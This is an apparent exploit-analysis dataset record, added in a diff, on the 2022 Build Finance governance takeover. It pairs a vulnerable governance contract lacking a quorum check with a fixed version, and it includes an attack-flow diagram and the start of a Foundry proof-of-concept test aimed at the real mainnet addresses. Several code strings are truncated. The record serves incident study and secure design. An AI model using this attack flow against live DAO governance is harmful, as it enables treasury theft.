@@ -1,0 +1,33 @@
+{
+ "id": "2022__2022-02-17_BuildFinance_GovernanceAttack",
+ "source_file": "2022/2022-02-17_BuildFinance_GovernanceAttack.md",
+ "title": "Build Finance — Governance Takeover Attack Analysis",
+ "date": "2022-02-17",
+ "protocol": "Build Finance",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$470,000 (BUILD tokens)",
+ "loss_usd": 470000.0,
+ "root_cause": "Governance quorum not met, or a single large token holder unilaterally passed a malicious proposal to seize treasury and minting privileges",
+ "attack_tx": "Block 14,235,712",
+ "vulnerable_contract": "BuildGovernance 0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583",
+ "classes": [
+  "governance"
+ ],
+ "code_before": [
+  "❌ Vulnerable BuildGovernance (pseudocode)\ncontract BuildGovernance {\n    mapping(uint256 => Proposal) public proposals;\n    IERC20 public buildToken;\n\n    //",
+  "❌ No quorum check: attacker can pass proposals unilaterally\n    function propose(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        string memory description\n    ) external returns (uint256) {\n        // Proposal creation: only checks minimum token balance, no quorum\n        require(buildToken.balanceOf(msg.sender) >= proposalThreshold);\n        uint256 proposalId = ++proposalCount;\n        proposals[proposalId] = Proposal({...});\n        return proposalId;\n    }\n\n    function execute(uint256 proposalId) external {\n        Proposal storage proposal = proposals[proposalId];\n        //",
+  "❌ No voter participation (quorum) check\n        require(proposal.forVotes > proposal.againstVotes, \"vote failed\");\n        //"
+ ],
+ "code_after": [
+  "✅ Correct pattern\ncontract GovernanceFixed {\n    uint256 public quorumVotes; // A fixed percentage of total supply (e.g., 4%)\n\n    function execute(uint256 proposalId) external {\n        Proposal storage proposal = proposals[proposalId];\n        //",
+  "✅ Quorum check\n        require(proposal.forVotes >= quorumVotes, \"quorum not reached\");\n        require(proposal.forVotes > proposal.againstVotes, \"vote failed\");\n        //"
+ ],
+ "steps": [
+  "Attacker votes alone → forVotes = attacker's holdings",
+  "→ Attacker gains unlimited spending rights over treasury BUILD"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Acquire 101,529,401 BUILD tokens\n    │       (market purchase or flash loan)\n    │\n    ├─[2] Call BuildGovernance.propose()\n    │       targets = [BUILD token contract]\n    │       calldatas = [approve(attacker, type(uint256).max)]\n    │       description = malicious proposal\n    │\n    ├─[3] BuildGovernance.vote(proposalId, true)\n    │       Attacker votes alone → forVotes = attacker's holdings\n    │       No against votes (community not monitoring)\n    │\n    ├─[4] 2 days elapse (only block-time-based delay exists)\n    │\n    ├─[5] BuildGovernance.execute(proposalId)\n    │       BUILD.approve(attacker, type(uint256).max) executed\n    │       → Attacker gains unlimited spending rights over treasury BUILD\n    │\n    └─[6] BUILD.transferFrom(treasury, attacker, full bal",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IBuildFinance {\n    function propose(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        string memory description\n    ) external returns (uint256);\n    function vote(uint256 proposalId, bool support) external;\n    function state(uint256 proposalId) external view returns (uint8);\n    function execute(uint256 proposalId) external payable;\n    function proposalCount() external view returns (uint256);\n}\n\ncontract ContractTest is Test {\n    IBuildFinance governance =\n        IBuildFinance(0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583);\n    IERC20 BUILD = IERC20(0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739);\n    address attacker = 0x562680a"
+ ]
+}
